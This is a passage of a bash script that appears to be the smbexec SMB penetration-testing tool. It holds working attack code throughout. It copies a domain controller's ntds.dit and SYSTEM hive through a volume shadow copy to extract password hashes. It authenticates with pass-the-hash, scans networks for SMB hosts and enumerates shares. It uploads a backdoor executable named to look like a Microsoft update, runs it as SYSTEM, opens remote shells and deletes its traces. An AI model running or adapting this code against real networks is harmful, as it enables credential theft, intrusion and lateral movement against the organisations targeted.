${smbexecpath}/smbwinexe --system -A /tmp/smbexec/smbexec.auth //${tf} "CMD /C dir ${ntdsdrive}${ntdspath}\\ntds.dit" &> /tmp/smbexec/ntds.size
disksize=$(cat /tmp/smbexec/ntds.size |grep free|cut -d ')' -f2|cut -d "b" -f1|sed -e 's/^[ \t]*//'|sed -e 's/,//g')
filesize=$(cat /tmp/smbexec/ntds.size |grep File|cut -d ')' -f2|cut -d "b" -f1|sed -e 's/^[ \t]*//'|sed 's/,//g')
if [ "${filesize}" -gt "${disksize}" ]; then
	echo -e "\e[1;31m[-]\e[0m Not enough diskspace available to save the ntds.dit file..."
	sleep 3
	f_mainmenu
else
	echo -e "\e[1;32m[+]\e[0m Plenty of diskspace..."
	f_createvss
fi
}
f_createvss(){
for i in $(cat ${RHOSTS}); do
	if [ ! -d ${logfldr}/hashes/DC ]; then
		mkdir -p ${logfldr}/hashes/DC
	fi
	# Create a Volume Shadow Copy
	echo -e "\n\e[1;34m[*]\e[0m Attempting to create a Volume Shadow Copy for the Domain Controller specified..."
	${smbexecpath}/smbwinexe --system -A /tmp/smbexec/smbexec.auth //${tf} "CMD /C vssadmin create shadow /for=${ntdsdrive}" &> /tmp/smbexec/vssdc.out
	vscpath=$(cat /tmp/smbexec/vssdc.out | grep "Volume Name"|cut -d " " -f9)
	vscid=\{$(cat /tmp/smbexec/vssdc.out |grep "Shadow Copy ID"|cut -d "{" -f2|cut -d "}" -f1)\}
	if [ -z "${vscpath}" ]; then
		echo -e "\e[1;31m[-]\e[0m Could not create a Volume Shadow Copy..."
		cat /tmp/smbexec/vssdc.out
		sleep 3
		f_freshstart
		f_mainmenu
	else
		echo -e "\e[1;32m[+]\e[0m Volume Shadow Copy Successfully Created..."
		sleep 2
	fi
	echo -e "\n\e[1;34m[*]\e[0m Attempting to copy the ntds.dit file from the Volume Shadow Copy..."
	sleep 2
	sharedrive="$(echo ${tempdrive}| cut -d":" -f1)$"
	${smbexecpath}/smbwinexe --system -A /tmp/smbexec/smbexec.auth //${tf} "CMD /C copy ${vscpath}\\${ntdspath}\\ntds.dit ${tempdrive}${temppath}\\ntds.dit && reg.exe save HKLM\SYSTEM ${tempdrive}${temppath}\\sys" &> /dev/null
	${smbexecpath}/smbexeclient -A /tmp/smbexec/smbexec.auth //${tf}/"${sharedrive}" -c "get ${temppath}\\ntds.dit ${logfldr}/hashes/DC/ntds.dit" &> /dev/null &
	# Attempt at a status for feedback while downloading large ntds.dit files
	f_download_stat
	${smbexecpath}/smbexeclient -A /tmp/smbexec/smbexec.auth //${tf}/"${sharedrive}" -c "get ${temppath}\\sys ${logfldr}/hashes/DC/sys" &> /dev/null
	if [ ! -e ${logfldr}/hashes/DC/ntds.dit ] && [ ! -e ${logfldr}/hashes/DC/sys ]; then
		echo -e "\e[1;31m[-]\e[0m Could not grab ntds.dit & sys files from the Domain Controller..."
		sleep 3
		f_freshstart
		f_mainmenu
	else
		echo -e "\e[1;32m[+]\e[0m We have ntds.dit & sys files...let's get some hashes"
	fi
	#cleanup the host
	echo -e "\n\e[1;34m[*]\e[0m Attempting to remove the files created from the Domain Controller..."
	${smbexecpath}/smbwinexe --system -A /tmp/smbexec/smbexec.auth //${tf} "CMD /C DEL ${tempdrive}${temppath}\sys && DEL ${tempdrive}${temppath}\ntds.dit" &> /dev/null
	echo -e "\n\e[1;34m[*]\e[0m Attempting to remove the shadow copy created from the Domain Controller..."
	${smbexecpath}/smbwinexe --uninstall --system -A /tmp/smbexec/smbexec.auth //${tf} "CMD /C vssadmin Delete Shadows /Shadow=${vscid} /quiet" &> /dev/null
done
f_esedbexport
f_dsusers
f_freshstart
f_mainmenu
}
f_download_stat(){
if [ -s ${logfldr}/hashes/DC/ntds.dit ]; then
	while [ "$(stat -c %s ${logfldr}/hashes/DC/ntds.dit)" -lt "${filesize}" ]; do
		file_stat=$(stat -c %s ${logfldr}/hashes/DC/ntds.dit)
		echo -e -n "\e[1;34m[*]\e[0m Downloading NTDS.dit file -> $(((${file_stat}*100/${filesize})))%\r"
	done
	echo -e "\n\e[1;32m[+]\e[0m NTDS.dit download complete"
else
	sleep .5
	f_download_stat
fi
}
f_finddcs(){
if [ "${SMBDomain}" != "." ]; then
	x="com net org local"
	for i in ${x}; do
		dig SRV _ldap._tcp.pdc._msdcs.${SMBDomain}.${i} |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/pdc.txt
		dig SRV _ldap._tcp.dc._msdcs.${SMBDomain}.${i} |egrep -v '(;|;;)' |grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' >> /tmp/smbexec/dcs.txt
	done
	if [ -s /tmp/smbexec/pdc.txt ]; then
		echo -e "\nPrimary Domain Controller\n========================="
		cat /tmp/smbexec/pdc.txt
	fi
	if [ -s /tmp/smbexec/dcs.txt ]; then
		echo -e "\nAll Domain Controllers\n======================"
		cat /tmp/smbexec/dcs.txt
		echo
	fi
fi
}
f_esedbexport(){
echo -e "\n\e[1;34m[*]\e[0m Extracting data and link tables from the ntds.dit file..."
sleep 2
eseexportpath=$(locate -l 1 -b "\esedbexport"| sed 's,/*[^/]\+/*$,,')
${eseexportpath}/esedbexport -l /tmp/smbexec/esedbexport.log -t /tmp/smbexec/ntds.dit ${logfldr}/hashes/DC/ntds.dit
datatable=$(ls /tmp/smbexec/ntds.dit.export/ | grep datatable)
linktable=$(ls /tmp/smbexec/ntds.dit.export/ | grep link_table)
}
f_dsusers(){
echo -e "\n\e[1;34m[*]\e[0m Extracting hashes, please standby..."
sleep 2
dsuserspath=$(locate -l 1 -b "\dsusers.py"| sed 's,/*[^/]\+/*$,,')
python ${dsuserspath}/dsusers.py /tmp/smbexec/ntds.dit.export/${datatable} /tmp/smbexec/ntds.dit.export/${linktable} --passwordhashes ${logfldr}/hashes/DC/sys --passwordhistory ${logfldr}/hashes/DC/sys > ${logfldr}/hashes/DC/ntds.output
${smbexecpath}/ntdspwdump.py ${logfldr}/hashes/DC/ntds.output > ${logfldr}/hashes/DC/${SMBDomain}-dc-hashes.lst
set -f	# turn off globbing
IFS='
'	# split at newlines only
for i in $(cat ${logfldr}/hashes/DC/${SMBDomain}-dc-hashes.lst); do
	dc_username=$(echo "${i}" |cut -d ":" -f1)
	dc_hashvalue=$(echo "${i}" |cut -d ":" -f3-4)
	echo -e ${dc_username}'\t'${dc_hashvalue} >> /tmp/smbexec/hash_pass_lst.tmp
done
unset IFS
set +f	# turn off globbing
#Remove accounts with empty passwords
cat /tmp/smbexec/hash_pass_lst.tmp |grep -v "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" > ${logfldr}/hashes/DC/cred.lst
if [ -s ${logfldr}/hashes/DC/${SMBDomain}-dc-hashes.lst ]; then
	echo -e "\n\e[1;32m[+]\e[0m Success, looks like we got what we came for..."
	sleep 2
else
	echo -e "\n\e[1;31m[-]\e[0m The file is empty, looks like something didn't work right..."
	sleep 3
	f_freshstart
	f_mainmenu
fi
}
#Function to build host list
f_hosts(){
f_banner
unset range
while [ -z "${range}" ]; do read -p " Enter your target network range (nmap format): " range; f_validaterange; done
echo -e "\n\e[1;34m[*]\e[0m Performing an nmap scan to identify live devices with ports 139 & 445 open.\n\n\t -This may take a bit.-"
nmap -sT -P0 -n -p139,445 --open "${range}" -oG ${logfldr}/host.gnmap &> /dev/null
cat ${logfldr}/host.gnmap | awk '{print $2}'|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u > ${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)
if [ -s ${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1) ]; then
	echo -e "\n\e[1;34m[*]\e[0m Hosts found:"
	cat ${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)
	rm ${logfldr}/host.gnmap
	echo -en "\n\e[1;34m[*]\e[0m Your host file is located at ${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)\n\n\tHit Enter to Return to Main Menu."
	read -p " "
else
	echo -en "\n\e[1;34m[*]\e[0m I'm sorry but no hosts were identified with port 139 or 445 open."
	rm ${logfldr}/host.gnmap
	rm ${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)
fi
	f_freshstart
	f_mainmenu
}
f_validaterange(){
# added nmap format validation - use of subnets (ex. 192.168.0.0/24), stars (ex. 192.168.*.*), and split ranges (ex. 192.168.1.1-10,14) now accepted.
if [ -z $(echo "${range}" | grep -E '^((25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]{1}){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]{1}){1}){0,}|\*)\.(((25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}){0,}|\*)\.){2}((25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}){0,}|\*|([0]{1}\/(8|9|[1-2]{1}[0-9]{1}|30|31|32){1})){1}$' | grep -v -E '([-][0-9]{1,3}[-])|(([,-].*[/]|[/].*[,-])|([*].*[/]|[/].*[*]))') ]; then
	unset range
else
	range=$(echo ${range})
fi
}
#Function to emuerate shares - thx c0ncealed, great idea!
f_enumshares(){
f_banner
unset p
if [[ -e "${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)" ]]; then p="[${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)]"; fi
read -e -p " Target IP or host list ${p}: " tf
if [ -z ${tf} ]; then tf="${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)"; fi
if [[ ${tf} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
	echo ${tf} > /tmp/smbexec/sharerhost.txt
	SHARERHOSTS=/tmp/smbexec/sharerhost.txt
elif [[ -e ${tf} ]]; then
	SHARERHOSTS=${tf}
elif [[ -z ${tf} ]]; then
	f_enumshares
else
	echo -en "\n Invalid IP or file does not exist.\n\n Hit enter to return to Main Menu."
	read -p " "
	f_mainmenu
fi
# Call the smbauth functions
f_smbauth
touch /tmp/smbexec/enum.shares
for i in $(cat "${SHARERHOSTS}"); do
	echo -e "\n***************" | tee -a /tmp/smbexec/enum.shares
	echo ${i} | tee -a /tmp/smbexec/enum.shares
	echo "***************" | tee -a /tmp/smbexec/enum.shares
	#not at all sure why $smbexecpath/smbexeclient wants to run the folder...
	cd ${smbexecpath}
	./smbexeclient -L ${i} -A /tmp/smbexec/smbexec.auth >& /tmp/smbexec/connects.tmp
	cd - &> /dev/null
	f_smbauthinfo
	#What we are going to show the user
	if [ ! -z "${logonfail}" ]; then
		echo -e "\e[1;31m[-]\e[0m Authentication to ${i} failed" | tee -a /tmp/smbexec/enum.shares
	elif [ ! -z "${connrefused}" ]; then
		echo -e "\e[1;31m[-]\e[0m Connection to ${i} was refused" | tee -a /tmp/smbexec/enum.shares
	elif [ ! -z "${unreachable}" ]; then
		echo -e "\e[1;31m[-]\e[0m There is no host assigned to IP address ${i} " | tee -a /tmp/smbexec/enum.shares
	elif [ ! -z "${accessdenied}" ]; then
		echo -e "\e[1;31m[-]\e[0m Remote access to ${i} was denied" | tee -a /tmp/smbexec/enum.shares
	else
		cat /tmp/smbexec/connects.tmp | awk '/Sharename/,/failed/'| egrep -v 'session|lame'| tee -a /tmp/smbexec/enum.shares
	fi
done
# Move the file
mv /tmp/smbexec/enum.shares ${logfldr}/${SMBUser}.host.shares.${DATE}
# We'll provide a statistical analysis of the shares file if it's there...
if [ -z $(cat ${logfldr}/*.host.shares.* | grep 'No such file' )  ]; then
	echo -e "\nTop 10 shares in enum file: \n\n    count\tshare\n ----------------------"
	cat ${logfldr}/*.host.shares.*| grep -E 'Disk' | cut -d" " -f1 | sed -e 's/^ *//' | sort | uniq -c | sort -nr | head -10
fi
echo -e "\n\e[1;34m[*]\e[0m The list of host shares can be found at ${logfldr}/${SMBUser}.host.shares.${DATE}\n\e[1;34m[*]\e[0m Hit enter to return to Main Menu."
read -p " "
f_freshstart
f_mainmenu
}
f_smbauth(){
unset SMBUser #Since the prog is a loop make sure we clear this out
while [ -z "${SMBUser}" ]; do read -r -e -p " Please provide the username to authenticate as: " SMBUser; done
unset SMBPass #Since the prog is a loop make sure we clear this out
#If the password is blank then we'll use the has value, otherwise smbwinexe & smbexeclient will request the password from the user	
read -e -p " Please provide the password or hash (<LM>:<NTLM>) [BLANK]: " SMBPass
if [ -z "${SMBPass}" ]; then
	SMBPass="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
fi
# Hashes are 65 characters long, this compares input to see if its a password or a hash
unset SMBHASH #Since the prog is a loop make sure we clear this out
if [ "$(echo ${SMBPass}| wc -m)" -ge "65" ]; then
	export SMBHASH=${SMBPass} # This is required when using a hash value
fi
# If a domain account is being used, ask for the domain name if not included in SMBUser 
if [[ -n $(echo ${SMBUser} | awk -F\\ '{printf("%s", $2)}') ]]; then
	SMBDomain=$(echo ${SMBUser} | awk -F\\ '{print $1}')
	SMBUser=$(echo ${SMBUser} | awk -F\\ '{print $2}')
else
	read -e -p " Please provide the Domain for the user account specified [localhost]: " SMBDomain
	if [ -z "${SMBDomain}" ]; then SMBDomain=.; fi #equivalent to localhost, thx Mubix!
fi
echo "username=${SMBUser}" > /tmp/smbexec/smbexec.auth
echo "password=${SMBPass}" >> /tmp/smbexec/smbexec.auth
echo "domain=${SMBDomain}" >> /tmp/smbexec/smbexec.auth
}
f_smbauthinfo(){
cat /tmp/smbexec/connects.tmp | grep "//${i}" > /tmp/smbexec/success.chk
logonfail=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_LOGON_FAILURE")
connrefused=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_CONNECTION_REFUSED")
badshare=$(cat /tmp/smbexec/connects.tmp | egrep 'NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_OBJECT_PATH_NOT_FOUND')
unreachable=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_HOST_UNREACHABLE")
accessdenied=$(cat /tmp/smbexec/connects.tmp | grep "NT_STATUS_ACCESS_DENIED")
}
f_smbauthresponse(){
unset uploadpayload
if [ -s /tmp/smbexec/success.chk ] && [ ! -z "${badshare}" ]; then
	echo -e "\e[1;34m[*]\e[0m Authentication to ${i} was successful, but the share doesn't exist"
elif [ ! -z "${logonfail}" ]; then
	echo -e "\e[1;31m[-]\e[0m Authentication to ${i} failed"
elif [ ! -z "${accessdenied}" ]; then
	echo -e "\e[1;31m[-]\e[0m Remote access to ${i} is denied"
elif [ ! -z "${connrefused}" ]; then
	echo -e "\e[1;31m[-]\e[0m Connection to ${i} was refused"
elif [ ! -z "${unreachable}" ]; then
	echo -e "\e[1;31m[-]\e[0m There is no host assigned to IP address ${i} "
elif [ -s /tmp/smbexec/success.chk ] && [ -z "${badshare}" ]; then
	echo -e "\e[1;32m[+]\e[0m Authentication to ${i} successful..."
	uploadpayload=1
else
	echo -e "\e[1;34m[*]\e[0m I'm not sure what happened on ${i}, supplying output..."
	cat /tmp/smbexec/connects.tmp | egrep -i 'error:|failed:'
fi
}
#Function to gain the basic info
f_getinfo(){
clear
f_banner
if [ "${sysexpchoice}" != "5" ]; then
	echo -e "\e[1;34m[*]\e[0m Let's get some info to finalize the attack...\n"
	if [ -z "${LPATH}" ]; then LPATH=${logfldr}/backdoor.exe; fi
	read -p "Please enter the name of a writable share on the victim. [C$] : " SMBShare
	if [ -z "${SMBShare}" ]; then SMBShare="C$"; fi
	# Check to see if the admin share is being used
	if [ "${SMBShare}" == "ADMIN$" ]; then
		isadmin=1
		prepath="\\Windows" # Need to add a prepath for the smbwinexe command to work properly
	fi
	# Check for a share with $ that is not C$
	share=$(echo ${SMBShare} | grep '\$' | grep -v 'ADMIN\$')
	if [ ! -z "${share}" ] && [ "${share}" != "C$" ]; then
	sharecheck=$(echo ${share} | cut -d "$" -f1) # Trim the $ off for the winexe share value
	oddshare="${sharecheck}:"
	fi
	# Check for a 1 letter share without a $
	onelettershare=$(echo ${SMBShare} | egrep -i '\<[e-z]\>')
	if [ ! -z "${onelettershare}" ]; then
		SMBShare="${onelettershare}"
		oddshare="${SMBShare}:"
	fi
	echo " Please provide the path to place the exe on the remote host."
	echo -n " Hit enter to place in root of share or enter path (ex: \\\\Temp): "
	read -p "" RPATH
	sharecheck=$(echo ${SMBShare} | cut -d "$" -f1)
	if [ -z "${RPATH}" ] && [ -z "${isadmin}" ] && [ -z "${oddshare}" ]; then
		superoddshare=1
	fi
	if [ -z "${RPATH}" ] && [ "${SMBShare}" == "C$" ]; then
		cemptyrpath=1
	fi
fi
f_smbauth
unset p
if [[ -e "${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)" ]]; then p="[${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)]"; fi
read -e -p " Target IP or host list ${p}: " tf
if [ -z ${tf} ]; then tf="${logfldr}/host.lst.$(echo ${range} | cut -d"/" -f1)"; fi
if [[ ${tf} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
	echo ${tf} > /tmp/smbexec/rhost.txt
	RHOSTS=/tmp/smbexec/rhost.txt
elif [[ -e ${tf} ]]; then
	RHOSTS=${tf}
else
	echo -en "   Invalid IP or file does not exist.\n"
fi
f_run_as_system
f_getsome
}
f_run_as_system(){
unset run_as_system
unset get_system
read -e -p " Would you like to execute the payload as SYSTEM [y/N]: " run_as_system
run_as_system=$(echo ${run_as_system}|tr 'A-Z' 'a-z')
if [ "${run_as_system}" == "y" ]; then
	get_system=--system
fi
}
f_jop(){
xdg-open http://www.youtube.com/watch?v=YLO7tCdBVrA &> /tmp/smbexec/jopjunk
f_mainmenu
}

# The name says it all...get your popcorn ready...
f_getsome(){
if [ "${sysexpchoice}" != "5" ]; then
	cat /dev/urandom| tr -dc '0-9'|head -c 6 > /tmp/smbexec/filename.rnd #create a random filename
	SMBFilename="msie-KB$(cat /tmp/smbexec/filename.rnd)-enu.exe" #set value for random filename
	echo -e "\n\e[1;34m[*]\e[0m Duck and Cover...Possible Falling Shells Ahead\n"
else
	echo -e "\n\e[1;34m[*]\e[0m Let's see if we can't get you a command prompt\n"
fi

if [ "${sysexpchoice}" != "5" ]; then 
	#prevents rage-quit while remote processes are in play
	dirty=1
fi

for i in $(cat "${RHOSTS}"); do
	# Force display output to a file. showconnect provides us an IP for the cleanup function
	if [ "${sysexpchoice}" == "5" ]; then
		${smbexecpath}/smbexeclient //${i}/IPC$ -A /tmp/smbexec/smbexec.auth -c "showconnect" >& /tmp/smbexec/connects.tmp 
	else
		${smbexecpath}/smbexeclient //${i}/${SMBShare} -A /tmp/smbexec/smbexec.auth -c "put ${LPATH} ${RPATH}\\${SMBFilename} ; showconnect" >& /tmp/smbexec/connects.tmp 
	fi
	# Check to see what type of error we got so we can tell the user
	f_smbauthinfo
	f_smbauthresponse
	if [ "${uploadpayload}" == "1" ] && [ "${sysexpchoice}" != "5" ];then
		echo -e "\e[1;32m[+]\e[0m Uploading and attempting to execute payload..."
	fi
	# Get successful IP addy for cleanup later
	ConnCheck=$(cat /tmp/smbexec/connects.tmp | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u)
	# If no successful connection was made above this portion is skipped
	if [ "${sysexpchoice}" == "5" ] && [ -s /tmp/smbexec/success.chk ]; then
		if [ -z ${isxrunning} ]; then
			screen -mS ${i}-Command_Shell -t "Command_Shell" bash -c "${smbexecpath}/smbwinexe --uninstall ${get_system} -A /tmp/smbexec/smbexec.auth //${i} CMD"
		else
			xterm -geometry 90x25 -T "${i}-Command Shell" -e ${smbexecpath}/smbwinexe --uninstall ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd" &
			sleep 2
		fi
	elif [ -s /tmp/smbexec/success.chk ] && [ -z "${badshare}" ]; then
		echo ${ConnCheck} >> /tmp/smbexec/hosts.loot.tmp # Place successful connection IPs into a holding file for the cleanup function
		if [ "${isadmin}" == "1" ]; then
			ADMINPATH=${prepath}${RPATH}
			${smbexecpath}/smbwinexe ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C ${ADMINPATH}\\${SMBFilename}" &> /tmp/smbexec/error.jnk &
		fi	
		if [ ! -z "${cemptyrpath}" ]; then
			${smbexecpath}/smbwinexe ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C C:\\${SMBFilename}" &> /tmp/smbexec/error.jnk &
		fi

		if [ ! -z "${oddshare}" ]; then
			${smbexecpath}/smbwinexe ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C ${oddshare} && ${RPATH}\\${SMBFilename}" &> /tmp/smbexec/error.jnk &
		elif [ ! -z "${superoddshare}" ]; then
			#Ugly hack for placing payload in root of shares like Users or Public. May only work for shares on the C drive
			${smbexecpath}/smbwinexe ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C \\${SMBShare}\\${SMBFilename}" &> /tmp/smbexec/error.jnk &
		else
			${smbexecpath}/smbwinexe ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C ${RPATH}\\${SMBFilename}" &> /tmp/smbexec/error.jnk &
		fi
		echo $! >> /tmp/smbexec/winexe.pid #grab the pid so we can kill it
		
	#Unset the variables because we're in a for-loop
	unset logonfail
	unset connrefused
	unset badshare
	unset unreachable
	fi
done
if [ -s /tmp/smbexec/hosts.loot.tmp ] && [ "${sysexpchoice}" != "5" ]; then
	echo -e "\n\e[1;34m[*]\e[0m Ready for cleanup!  Hit enter when the shells stop rolling in..."
	read
	f_cleanup
else
	f_mainmenu
fi
}

f_cleanup(){
# Cleaning up the victims - killing exploit procs & removing the exe file
# Only those with successful logins will be hit again
if [ -s /tmp/smbexec/hosts.loot.tmp ]; then
	cat /tmp/smbexec/hosts.loot.tmp | sed '/^$/d'| sort -u > /tmp/smbexec/hosts.loot
	RHOSTS=/tmp/smbexec/hosts.loot
fi
if [ -s /tmp/smbexec/hosts.loot ]; then
	echo -e "\e[1;34m[*]\e[0m Go play with your shells I've gotta clean up the mess you made..."
	for i in $(cat ${RHOSTS}); do
		echo
		echo "***************"
		echo ${i}
		echo "***************"
		echo -e "\e[1;34m[*]\e[0m Killing the file process on the victim, please standby"
		${smbexecpath}/smbwinexe --system -A /tmp/smbexec/smbexec.auth //${i} "cmd /C taskkill /IM ${SMBFilename} /F" &> /tmp/smbexec/error.jnk
		echo -e "\e[1;34m[*]\e[0m Removing the file from the victim, please standby"
		if [ ! -z ${cemptyrpath} ]; then
			${smbexecpath}/smbwinexe --uninstall ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C DEL C:\\${SMBFilename}" &> /tmp/smbexec/error.jnk
		elif [ "${isadmin}" == "1" ]; then
			${smbexecpath}/smbwinexe --uninstall ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C DEL ${ADMINPATH}\\${SMBFilename}" &> /tmp/smbexec/error.jnk
		elif [ ! -z "${oddshare}" ]; then
			${smbexecpath}/smbwinexe --uninstall ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C ${oddshare} && DEL ${RPATH}\\${SMBFilename}" &> /tmp/smbexec/error.jnk
		elif [ ! -z "${superoddshare}" ]; then
			#Ugly hack for removing payload in root of shares like Users or Public. May only work for shares on the C drive
			${smbexecpath}/smbwinexe --uninstall ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C cd ${SMBShare} && DEL \\${SMBFilename}" &> /tmp/smbexec/error.jnk
		else
			${smbexecpath}/smbwinexe --uninstall ${get_system} -A /tmp/smbexec/smbexec.auth //${i} "cmd /C DEL ${RPATH}\\${SMBFilename}" &> /tmp/smbexec/error.jnk
		fi
	done
else
	echo -e "\n\e[1;34m[*]\e[0m Sorry, no shells. Maybe next time...\e[0m\n\n"
fi
#prevents rage-quit while remote processes are in play
if [ "${dirty}" -eq 1 ];then
	unset dirty
fi
# Create a list of ips we successfully exploited unless none were exploited
if [ -s /tmp/smbexec/hosts.loot ]; then
	mv /tmp/smbexec/hosts.loot ${logfldr}/${SMBUser}.hosts.looted.${DATE}
	echo -e "\e[1;34m[*]\e[0m The list of hosts successfully exploited can be found at ${logfldr}/${SMBUser}.hosts.looted.${DATE}"
fi
echo -en "\n\e[1;34m[*]\e[0m Hit enter to return to Main Menu"
read -p ""
if [ -e /tmp/smbexec/winexe.pid ]; then
	for i in $(cat /tmp/smbexec/winexe.pid); do
		kill -9 $(cat /tmp/smbexec/winexe.pid) #Kill off the winexe pid because it doesn't seem to exit gracefully
		wait $(cat /tmp/smbexec/winexe.pid) 2>/dev/null #Prevents output from pid kill to be written to screen
	done
fi
f_freshstart
f_mainmenu
}
f_freshstart(){

rm -rf /tmp/smbexec/ # cleanup all the stuff we put in the temp dir
# unset variables to prevent problems in the loop
vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHASH SMBPass SMBUser superoddshare tf unreachable datatable linktable check_for_da sysenumchoice sysexpchoice"
for var in ${vars}; do
	unset ${var}
done

if [ -z "$(ls -A ${logfldr})" ];then
	rm -rf ${logfldr}
	logfldr=${PWD}/$(date +%F-%H%M)-smbexec
	mkdir ${logfldr}
fi

}
f_freshstop(){
rm -rf /tmp/smbexec/ # cleanup all the stuff we put in the temp dir
# unset variables to prevent problems in the loop
vars="badshare cemptyrpath ConnCheck connrefused enumber i isadmin lhost listener logonfail LPATH machine mainchoice oddshare onelettershare p paychoice payload port rcpath RHOSTS RPATH seed SHARERHOSTS SMBDomain SMBFilename SMBHASH SMBPass SMBUser superoddshare tf unreachable datatable linktable check_for_da sysenumchoice sysexpchoice"
for var in ${vars}; do
	unset ${var}
done
if [[ -z $(ls -A ${logfldr}) ]];then rm -rf ${logfldr}; fi
clear
exit

}
f_system_enumeration_menu(){
clear
f_banner
echo -e "\e[1;37mSystem Enumeration Menu\e[0m"
echo "1. Create a host list"
echo "2. Enumerate Shares"
echo "3. Administrator login validation"
echo "4. Check systems for Domain Admin"
echo "5. Check systems for UAC"
echo "6. Main menu"
read -p "Choice: " sysenumchoice
case "${sysenumchoice}" in
	1) f_hosts ;;
	2) f_enumshares ;;
	3) f_smb_login ;;
	4) f_da_sys_check ;;
	5) f_uac_setup ;;
	6) f_mainmenu ;;
	*) f_system_enumeration_menu ;;
esac
}
f_system_exploitation_menu(){
clear
f_banner
echo -e "\e[1;37mSystem Access Menu\e[0m"
echo "1. Remote system access"
echo "2. Create an executable and rc script"
echo "3. Disable UAC"
echo "4. Enable UAC"
echo "5. Remote Command Shell"
echo "6. Main Menu"
read -p "Choice: " sysexpchoice
case "${sysexpchoice}" in
	1) f_vanish ;;
	2) f_vanish ;;
	3) f_uac_setup ;;
	4) f_uac_setup ;;
	5) f_getinfo ;;
	6) f_mainmenu ;;
	*) f_system_exploitation_menu ;;
esac
}
f_obtain_hashes_menu(){
clear
f_banner
echo -e "\e[1;37mObtain Hashes Menu\e[0m"
echo "1. Workstation & Server Hashes"
echo "2. Domain Controller"
echo "3. Main Menu"
read -p "Choice: " hashchoice
case "${hashchoice}" in
	1) f_hashgrab ;;
	2) f_dchashgrab ;;
	3) f_mainmenu ;;
	*) f_obtain_hashes_menu ;;
esac
}
f_mainmenu(){
if [ ! -d /tmp/smbexec/ ]; then mkdir /tmp/smbexec/; fi
DATE=$(date +"%H%M")
clear
f_banner
echo -e "\e[1;37mMain Menu\e[0m"
echo "1. System Enumeration"
echo "2. System Access"
echo "3. Obtain Hashes"
echo "4. Exit"
read -p "Choice: " mainchoice
case "${mainchoice}" in
	1) f_system_enumeration_menu;;
	2) f_system_exploitation_menu;;
	3) f_obtain_hashes_menu;;
	4) f_freshstop;;
	JOP) f_jop;;
	*) f_mainmenu
esac
}
# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[-]\e[0m This script must be run as root" 1>&2
	exit 1
else
	f_mainmenu
fi
